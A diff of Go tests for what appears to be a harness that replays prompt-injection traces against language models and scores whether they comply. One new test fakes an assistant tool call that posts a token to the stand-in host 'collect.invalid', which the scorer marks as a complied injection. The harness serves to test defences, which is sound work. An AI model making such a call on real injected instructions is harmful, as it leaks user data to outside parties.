@@ -8,6 +8,7 @@ import (
 	"net/http/httptest"
 	"reflect"
 	"testing"
+	"time"
 
 	"github.com/kstruzzieri/go-llm/ollama"
 	"github.com/kstruzzieri/go-llm/provider"
@@ -38,6 +39,12 @@ func TestReplayInjectionSendsFrozenWireWithTools(t *testing.T) {
 	}
 	if !c.got.KeepRawCalls || c.got.ProviderOptions == nil || c.got.ProviderOptions.NumPredict != 1024 {
 		t.Fatalf("raw channel or registered options not requested: %+v", c.got)
+	}
+	if len(c.got.RawToolArgs) != len(c.got.Messages) {
+		t.Fatalf("RawToolArgs has %d entries for %d messages", len(c.got.RawToolArgs), len(c.got.Messages))
+	}
+	if ra := c.got.RawToolArgs[2]; len(ra) != 1 || string(ra[0]) != `{"path":"notes.md"}` {
+		t.Fatalf("frozen assistant arguments must pass byte-exact, got %q", ra)
 	}
 	if len(out.Transcript) != 1 || out.Transcript[0].Content != "summary of notes" {
 		t.Fatalf("transcript must hold only the candidate turn: %+v", out.Transcript)
@@ -109,5 +116,30 @@ func TestOpenAICompatRawChannelFromHTTPBody(t *testing.T) {
 	}
 	if !reflect.DeepEqual(resp.RawToolCalls, want) {
 		t.Fatalf("raw channel\n got %+v\nwant %+v", resp.RawToolCalls, want)
+	}
+}
+
+// runOne must dispatch injection traces to replayInjection and hand the raw
+// channel to the scorer and to the returned Result.
+func TestRunOneInjectionWiresRawCalls(t *testing.T) {
+	c := &fakeInjectionClient{resp: candidateChatResponse{
+		Message: ollama.ChatMessage{Role: "assistant"},
+		RawToolCalls: []injectionRawCall{{ID: "x", Name: "mcp__web__http_post",
+			Arguments: "{\"url\":\"https://collect.invalid\",\"body\":\"" + tm + "\"}", ArgumentsPresent: true, DecodeOK: true}},
+	}}
+	r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute}
+	res := r.runOne(context.Background(), candidateTransport{chat: c, providerName: "openai-compat"},
+		ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}, validInjectionTrace())
+	if res.Err != nil {
+		t.Fatalf("err: %v", res.Err)
+	}
+	if len(res.RawToolCalls) != 1 || res.RawToolCalls[0].ID != "x" {
+		t.Fatalf("returned Result lost the raw channel: %+v", res.RawToolCalls)
+	}
+	if res.Score.InjectionOutcome != "complied" || !res.Score.ForbiddenToolAttempted {
+		t.Fatalf("scorer saw outcome %q forbidden=%v; want complied/true", res.Score.InjectionOutcome, res.Score.ForbiddenToolAttempted)
+	}
+	if len(res.Transcript) != 1 {
+		t.Fatalf("transcript = %d turns; want only the candidate turn", len(res.Transcript))
 	}
 }
